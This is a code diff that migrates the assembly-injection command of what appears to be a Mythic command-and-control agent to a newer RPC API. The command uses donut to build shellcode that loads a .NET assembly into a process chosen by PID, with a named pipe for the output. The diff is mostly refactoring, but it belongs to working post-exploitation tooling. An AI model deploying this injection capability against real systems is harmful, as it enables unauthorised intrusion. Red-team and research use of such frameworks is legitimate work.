@@ -61,21 +61,21 @@ class AssemblyInjectArguments(TaskArguments):
 
     async def get_files(self, inputMsg: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
         fileResponse = PTRPCDynamicQueryFunctionMessageResponse(Success=False)
-        file_resp = await MythicRPC().execute("get_file", callback_id=inputMsg.Callback,
-                                              limit_by_callback=False,
-                                              get_contents=False,
-                                              filename="",
-                                              max_results=-1)
-        if file_resp.status == MythicRPCStatus.Success:
+        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
+            CallbackID=inputMsg.Callback,
+            LimitByCallback=False,
+            Filename="",
+        ))
+        if file_resp.Success:
             file_names = []
-            for f in file_resp.response:
-                if f["filename"] not in file_names and f["filename"].endswith(".exe"):
-                    file_names.append(f["filename"])
+            for f in file_resp.Files:
+                if f.Filename not in file_names and f.Filename.endswith(".exe"):
+                    file_names.append(f.Filename)
             fileResponse.Success = True
             fileResponse.Choices = file_names
             return fileResponse
         else:
-            fileResponse.Error = file_resp.error
+            fileResponse.Error = file_resp.Error
             return fileResponse
 
     async def parse_arguments(self):
@@ -121,28 +121,33 @@ class AssemblyInjectCommand(CommandBase):
         shutil.copy(outputPath, EXEECUTE_ASSEMBLY_PATH)
 
 
-    async def create_tasking(self, task: MythicTask) -> MythicTask:
+    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
+        response = PTTaskCreateTaskingMessageResponse(
+            TaskID=taskData.Task.ID,
+            Success=True,
+        )
         global EXEECUTE_ASSEMBLY_PATH
-        task.args.add_arg("pipe_name",  str(uuid4()))
+        taskData.args.add_arg("pipe_name",  str(uuid4()))
         if not path.exists(EXEECUTE_ASSEMBLY_PATH):
             await self.build_exeasm()
         
-        donutPic = donut.create(file=EXEECUTE_ASSEMBLY_PATH, params=task.args.get_arg("pipe_name"))
-        file_resp = await MythicRPC().execute("create_file",
-                                              task_id=task.id,
-                                              file=base64.b64encode(donutPic).decode(),
-                                              delete_after_fetch=True)
-        if file_resp.status == MythicStatus.Success:
-            task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
+        donutPic = donut.create(file=EXEECUTE_ASSEMBLY_PATH, params=taskData.args.get_arg("pipe_name"))
+        file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
+            TaskID=taskData.Task.ID,
+            FileContents=donutPic,
+            DeleteAfterFetch=True
+        ))
+        if file_resp.Success:
+            taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
         else:
-            raise Exception("Failed to register execute-assembly DLL: " + file_resp.error)
+            raise Exception("Failed to register execute-assembly DLL: " + file_resp.Error)
         
-        task.display_params = "-PID {} -Assembly {} -Arguments {}".format(
-            task.args.get_arg("pid"),
-            task.args.get_arg("assembly_name"),
-            task.args.get_arg("assembly_arguments")
+        response.DisplayParams = "-PID {} -Assembly {} -Arguments {}".format(
+            taskData.args.get_arg("pid"),
+            taskData.args.get_arg("assembly_name"),
+            taskData.args.get_arg("assembly_arguments")
         )
-        return task
+        return response
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
         resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
